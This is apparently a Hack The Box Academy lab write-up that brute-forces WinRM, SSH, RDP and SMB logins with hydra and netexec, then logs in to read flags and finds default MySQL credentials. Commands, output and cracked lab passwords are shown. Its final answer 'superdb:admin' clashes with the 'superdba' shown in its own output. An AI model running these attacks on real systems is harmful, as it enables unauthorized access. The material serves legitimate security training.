
## WinRM

- WinRM stands for Windows Remote Management.
- The protocol WS-Management was developed to remotely manage systems and is the blueprint for the WinRM service.
- The practical implementation of WS-Management protocol was done by Microsoft in WinRM service.
- The WinRM service is used for remotely managing of Windows servers and devices.
- The SOAP protocol is used to communicate messages in WinRM service which uses XML as its messaging format.


## RDP

- Microsoft's [Remote Desktop Protocol](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) (`RDP`) is a network protocol that allows remote access to Windows systems via `TCP port 3389` by default. RDP provides both users and administrators/support staff with remote access to Windows hosts within an organization.

## SSH 

- SSH stands for Secure Shell.
- A more secure way to connect to a remote machine to execute commands or transfer files.
- Uses `TCP port 22`
- Asymmetric Encryption i.e. uses 2 keys public and private key for encryption and decryption respectively.

## Symmetric Encryption

- Uses a single key for encryption and decryption.
- Less secure.

## Asymmetric Encryption

- Uses 2 keys. Public and private key for encryption and decryption respectively.
- More secure.

---
## Questions and Solutions


- Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
	- **HTB{redacted}**

#### Bruteforce Attack on WinRM

```bash
$ netexec winrm 10.129.202.136 -u username.list -p password.list
WINRM       10.129.202.136  5985   WINSRV           [*] Windows 10 / Server 2019 Build 17763 (name:WINSRV) (domain:WINSRV)
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\Administrator:123456
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\cassie:123456
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\chris:123456
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\dennis:123456
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\jerome:123456
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\john:123456
...(SNIP)...
WINRM       10.129.202.136  5985   WINSRV           [+] WINSRV\john:november (Pwn3d!)
```

#### Logging into WinRM

```bash
$ evil-winrm -i 10.129.202.136 -u john
Enter Password: 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> whoami
winsrv\john
```

#### Getting the flag

```bash
*Evil-WinRM* PS C:\Users\john\Documents> cd ..
*Evil-WinRM* PS C:\Users\john> ls


    Directory: C:\Users\john


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         1/5/2022   8:08 AM                3D Objects
d-r---         1/5/2022   8:08 AM                Contacts
d-r---         1/5/2022   8:11 AM                Desktop
d-r---         1/5/2022   8:08 AM                Documents
d-r---         1/5/2022   8:08 AM                Downloads
d-r---         1/5/2022   8:08 AM                Favorites
d-r---         1/5/2022   8:08 AM                Links
d-r---         1/5/2022   8:08 AM                Music
d-r---         1/5/2022   8:08 AM                Pictures
d-r---         1/5/2022   8:08 AM                Saved Games
d-r---         1/5/2022   8:08 AM                Searches
d-r---         1/5/2022   8:08 AM                Videos


*Evil-WinRM* PS C:\Users\john> cd Desktop
*Evil-WinRM* PS C:\Users\john\Desktop> ls


    Directory: C:\Users\john\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         1/5/2022   8:13 AM             18 flag.txt


*Evil-WinRM* PS C:\Users\john\Desktop> more flag.txt
HTB{redacted}
```


- Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
	- **HTB{redacted}**


#### Bruteforce Attack on SSH

```bash
$ hydra -L username.list -P password.list ssh://10.129.202.136 -t 10
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-16 03:10:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 10 tasks, 21112 login tries (l:104/p:203), ~2112 tries per task
[DATA] attacking ssh://10.129.202.136:22/
[STATUS] 110.00 tries/min, 110 tries in 00:01h, 21002 to do in 03:11h, 10 active
[22][ssh] host: 10.129.202.136   login: dennis   password: rockstar
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```
#### Logging into SSH

```bash
ssh dennis@10.129.202.136
```
#### Getting the flag

```bash
dennis@WINSRV C:\Users\dennis>dir 
 Volume in drive C has no label. 
 Volume Serial Number is 2683-3D37

 Directory of C:\Users\dennis

01/05/2022  09:14 AM    <DIR>          .
01/05/2022  09:14 AM    <DIR>          ..
01/05/2022  09:14 AM    <DIR>          3D Objects
01/05/2022  09:14 AM    <DIR>          Contacts
01/05/2022  09:16 AM    <DIR>          Desktop
01/05/2022  09:14 AM    <DIR>          Documents
01/05/2022  09:14 AM    <DIR>          Downloads
01/05/2022  09:14 AM    <DIR>          Favorites
01/05/2022  09:14 AM    <DIR>          Links
01/05/2022  09:14 AM    <DIR>          Music
01/05/2022  09:14 AM    <DIR>          Pictures
01/05/2022  09:14 AM    <DIR>          Saved Games
01/05/2022  09:14 AM    <DIR>          Searches
01/05/2022  09:14 AM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  26,307,031,040 bytes free

dennis@WINSRV C:\Users\dennis>cd Desktop

dennis@WINSRV C:\Users\dennis\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 2683-3D37

 Directory of C:\Users\dennis\Desktop

01/05/2022  09:16 AM    <DIR>          .
01/05/2022  09:16 AM    <DIR>          ..
01/05/2022  09:39 AM                15 flag.txt
               1 File(s)             15 bytes
               2 Dir(s)  26,307,031,040 bytes free
dennis@WINSRV C:\Users\dennis\Desktop>more flag.txt
HTB{redacted}
```


- Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
	- **HTB{redacted}**

#### Bruteforce Attack on RDP

```bash
$ hydra -L username.list -P password.list rdp://10.129.202.136 -t 10
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-16 03:45:49
[WARNING] rdp servers often don''t like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1218 login tries (l:6/p:203), ~305 tries per task
[DATA] attacking rdp://10.129.202.136:3389/
[STATUS] 118.00 tries/min, 118 tries in 00:01h, 1101 to do in 00:10h, 3 active
[3389][rdp] account on 10.129.202.136 might be valid but account not active for remote desktop: login: cassie password: 12345678910, continuing attacking the account.
[STATUS] 93.67 tries/min, 281 tries in 00:03h, 938 to do in 00:11h, 3 active
[3389][rdp] host: 10.129.202.136   login: chris   password: 789456123
[ERROR] freerdp: The connection failed to establish.
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session
```

#### Logging into RDP

Log into the remote host using the below credentials. The `flag.txt` will be in the Desktop read its contents to get the flag.

```bash
$ xfreerdp /v:10.129.202.136 /u:chris
```



- Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
	- **HTB{redacted}**


#### Bruteforce Attack on SMB

```bash
$ netexec smb 10.129.202.136 -u "cassie" -p password.list
SMB         10.129.202.136  445    WINSRV           [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.202.136  445    WINSRV           [-] WINSRV\cassie:123456 STATUS_LOGON_FAILURE 
SMB         10.129.202.136  445    WINSRV           [-] WINSRV\cassie:12345 STATUS_LOGON_FAILURE 
SMB         10.129.202.136  445    WINSRV           [-] WINSRV\cassie:123456789 STATUS_LOGON_FAILURE 
SMB         10.129.202.136  445    WINSRV           [-] WINSRV\cassie:batman STATUS_LOGON_FAILURE 
...(SNIP)...
SMB         10.129.202.136  445    WINSRV           [+] WINSRV\cassie:12345678910 
```

#### Listing Shares

```bash
$ netexec smb 10.129.202.136 -u "cassie" -p "12345678910" --shares
SMB         10.129.202.136  445    WINSRV           [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.202.136  445    WINSRV           [+] WINSRV\cassie:12345678910 
SMB         10.129.202.136  445    WINSRV           [*] Enumerated shares
SMB         10.129.202.136  445    WINSRV           Share           Permissions     Remark
SMB         10.129.202.136  445    WINSRV           -----           -----------     ------
SMB         10.129.202.136  445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.202.136  445    WINSRV           C$                              Default share
SMB         10.129.202.136  445    WINSRV           CASSIE          READ,WRITE      
SMB         10.129.202.136  445    WINSRV           IPC$            READ            Remote IPC
```
#### Getting the flag

```bash
$ smbclient -U cassie //10.129.202.136/CASSIE
Password for [WORKGROUP\cassie]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Mon Mar 16 03:18:37 2026
  ..                                 DR        0  Mon Mar 16 03:18:37 2026
  desktop.ini                       AHS      282  Thu Jan  6 08:44:52 2022
  flag.txt                            A       16  Thu Jan  6 08:46:14 2022

		10328063 blocks of size 4096. 6417589 blocks available
smb: \> get flag.txt
getting file \flag.txt of size 16 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> exit
┌─[eu-academy-6]─[10.10.14.195]─[htb-ac-952552@htb-f9bchwh8gy-htb-cloud-com]─[~]
└──╼ [★]$ cat flag.txt
HTB{redacted}
```


- Use the credentials provided to log into the target machine and retrieve the MySQL credentials. Submit them as the answer. SSH to 10.129.20.31 (ACADEMY-PWATTACKS-NIX01), with user "`sam`" and password "`B@tm@n2022!`"
	- **superdb:admin**

#### Logging into SSH

Provide the given password to login into SSH as `sam` user.

```bash
$ ssh sam@10.129.20.34
```

#### Looking for Default Creds

Install the default credentials first using `pip3 install defaultcreds-cheat-sheet`. You might need to setup python virtual environment first. Since we are exploiting `mysql` so I used the below command to look up for default creds.

```bash
$ creds search mysql
+---------------------+-------------------+----------+
| Product             |      username     | password |
+---------------------+-------------------+----------+
| mysql (ssh)         |        root       |   root   |
| mysql               | admin@example.com |  admin   |
| mysql               |        root       | <blank>  |
| mysql               |      superdba     |  admin   |
| scrutinizer (mysql) |    scrutremote    |  admin   |
+---------------------+-------------------+----------+
```

#### Logging into MySQL

Logging into MySQL using the default credentials list.

```bash
$ mysql -u superdba -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 13
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

So we were successfully able to login into the MySQL using the default credentials `superdb:admin`